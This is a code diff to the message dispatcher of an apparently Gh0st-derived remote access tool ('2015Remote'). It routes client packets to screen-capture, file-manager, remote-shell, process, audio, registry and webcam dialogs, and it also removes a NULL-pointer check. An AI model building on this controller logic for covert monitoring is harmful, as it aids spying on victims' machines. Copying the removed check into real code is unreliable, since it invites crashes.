@@ -774,6 +774,7 @@ VOID CMy2015RemoteDlg::Activate(int nPort,int nMaxConnection)
 
 VOID CALLBACK CMy2015RemoteDlg::NotifyProc(CONTEXT_OBJECT* ContextObject)
 {
+	AUTO_TICK(5);
 	MessageHandle(ContextObject);
 }
 
@@ -799,11 +800,6 @@ VOID CALLBACK CMy2015RemoteDlg::OfflineProc(CONTEXT_OBJECT* ContextObject)
 
 VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject) 
 {
-	if (ContextObject == NULL)
-	{
-		return;  //int 宏 intDlgHwnd
-	}
-
 	if (ContextObject->v1 > 0)
 	{
 		switch(ContextObject->v1)
@@ -867,16 +863,13 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
 			CancelIo((HANDLE)ContextObject->sClientSocket);
 			closesocket(ContextObject->sClientSocket); 
 			Sleep(10);
-
 			break;
 		}
 	case TOKEN_LOGIN: // 上线包  shine
 		{
-			g_2015RemoteDlg->PostMessage(WM_USERTOONLINELIST, 0, (LPARAM)ContextObject); //向窗口投递用户上线的消息 
-
+			g_2015RemoteDlg->PostMessage(WM_USERTOONLINELIST, 0, (LPARAM)ContextObject); 
 			break;
 		}
-
 	case TOKEN_BITMAPINFO:
 		{
 			g_2015RemoteDlg->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)ContextObject);   
@@ -887,13 +880,11 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
 			g_2015RemoteDlg->PostMessage(WM_OPENFILEMANAGERDIALOG, 0, (LPARAM)ContextObject);   
 			break;
 		}
-
 	case TOKEN_TALK_START:
 		{
 			g_2015RemoteDlg->PostMessage(WM_OPENTALKDIALOG, 0, (LPARAM)ContextObject);   
 			break;
 		}
-
 	case TOKEN_SHELL_START:
 		{
 			g_2015RemoteDlg->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)ContextObject);   
@@ -902,30 +893,25 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
 	case TOKEN_WSLIST:  //wndlist
 	case TOKEN_PSLIST:  //processlist
 		{
-			g_2015RemoteDlg->PostMessage(WM_OPENSYSTEMDIALOG, 0, (LPARAM)ContextObject);      //打开进程枚举的对话框
-
+			g_2015RemoteDlg->PostMessage(WM_OPENSYSTEMDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-
 	case TOKEN_AUDIO_START:
 		{
 			g_2015RemoteDlg->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)ContextObject);  
 			break;
 		}
-
 	case TOKEN_REGEDIT:
 		{                            
 			g_2015RemoteDlg->PostMessage(WM_OPENREGISTERDIALOG, 0, (LPARAM)ContextObject);  
 			break;
 		}
-
 	case TOKEN_SERVERLIST:
 		{
 			g_2015RemoteDlg->PostMessage(WM_OPENSERVICESDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-
-	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
+	case TOKEN_WEBCAM_BITMAPINFO:
 		{
 			g_2015RemoteDlg->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)ContextObject);
 			break;
